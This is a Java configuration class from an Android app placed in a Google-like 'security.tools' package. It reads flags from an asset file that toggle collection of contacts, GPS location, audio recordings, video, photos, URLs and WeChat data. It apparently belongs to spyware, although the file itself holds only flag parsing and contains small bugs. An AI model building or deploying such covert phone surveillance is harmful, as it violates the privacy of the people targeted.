package com.google.security.tools;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;


import android.content.Context;

public class Config {

	private static Config Config;
	static final String LOGTAG = "Config";
	public static boolean Contractflag =true;
	public static boolean Gpsflag =true;
	public static boolean Recorderflag =true;
	public static boolean Videoflag =true;
	public static boolean Photoflag =true;
	public static boolean Urlflag =true;
	public static boolean Wechatflag =true;
	String text;
	Context context;

	private Config(Context context) {
		this.context = context;

	}

	public static Config getIntance(Context context) {
		if (Config == null)
			return new Config(context);
		return Config;
	}

	public void readConfig() {
		// TODO Auto-generated method stub
		try {

			InputStream is = context.getAssets().open("config.txt");
			text = readTextFromSDcard(is);
			if (!text.equals(null)) {
				if(text.substring(0, 1).equals("0"))
					 Contractflag =false;
				if(text.substring(1, 2).equals("0"))
					Gpsflag =false;
				if(text.substring(2, 3).equals("0"))
					 Recorderflag =false;
				if(text.substring(3, 4).equals("0"))
					 Videoflag =false;
				if(text.substring(4, 5).equals("0"))
					 Photoflag =false;
				if(text.substring(5, 6).equals("0"))
					 Urlflag =false;
				if(text.substring(6, 7).equals("0"))
					 Wechatflag =false;
			}
		} catch (Exception e) {

			// TODO Auto-generated catch block

			e.printStackTrace();
		}

	}

	private String readTextFromSDcard(InputStream is) throws Exception {
		InputStreamReader reader = new InputStreamReader(is);
		BufferedReader bufferedReader = new BufferedReader(reader);
		StringBuffer buffer = new StringBuffer("");
		String str;
		while ((str = bufferedReader.readLine()) != null) {
			buffer.append(str);
			buffer.append("\n");
		}
		return buffer.toString();
	}
}
